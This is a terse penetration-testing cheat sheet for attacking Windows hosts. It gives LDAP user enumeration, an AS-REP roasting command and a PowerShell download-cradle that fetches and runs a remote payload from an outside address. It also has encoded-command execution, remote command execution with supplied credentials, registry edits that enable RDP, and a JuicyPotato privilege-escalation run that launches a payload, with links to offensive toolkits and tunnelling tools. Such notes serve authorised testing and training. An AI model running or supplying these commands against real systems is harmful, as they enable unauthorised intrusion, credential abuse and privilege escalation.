# Windows 

## LDAP

```bash
ldapsearch -x -h $target  -s base namingcontexts
```
```bash
ldapsearch -x -h $target -b "$namingcontext" \
                "(&(objectcategory=person)(objectclass=user))" \
                primaryGroupID userPrincipalName sAMAccountName userPassword ufn badPwdcount
```
```bash
impacket-GetNPUsers -dc-ip $taget $domain/ -usersfile users.txt
```

### Decompiler

DotNET

- https://github.com/0xd4d/dnSpy

## Payloads

- https://github.com/samratashok/nishang

## PowerShell

### HTTP Request

```powershell
> IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.1/payload.ps1')
```

### Run encoded command

```powershell
powershell -EncodedCommand BASE64
```

### Create Local credential object

```powershell
> $pass = ConvertTo-SecureString "SecretPassword" -AsPlainText -Force
> $cred = New-Object System.Management.Automation.PsCredential('username', $pass)

```

### Run command as
```powershell
> Invoke-Command -computer HOSTNAME -credential $cred -ScriptBlock { whoami }
```

### Mount share

```powershell
> New-PSDrive -Name "Public" -PSProvider "FileSystem" -Root "\\Server01\Public" -Credential $cred

```

### Enable RDP

```
reg setval -k 'HKLM\System\CurrentControlSet\Control\Terminal Server' -v 'fDenyTSConnections' -d "1"
```

On Windows XP
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```



## Privilege escalation
### Local checks
- https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1
- https://github.com/GhostPack/SharpUp
- https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS


```
.\winPEAS.exe cmd fast > winPEAS.log
```

### Techniques

**SeImpersonatePrivilege** (Mean juicy potato may works)

- https://github.com/ohpe/juicy-potato

```
.\JuicyPotato.exe -t * -p \users\public\music\payload.run.bat -l 1337 [ {CLSID } || NULL]
```

[CLSID list](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)

## Pivot (tunnel)

- https://github.com/jpillora/chisel

# Miscellaneous 

Binaries abuse:
- https://lolbas-project.github.io/ (Windows)

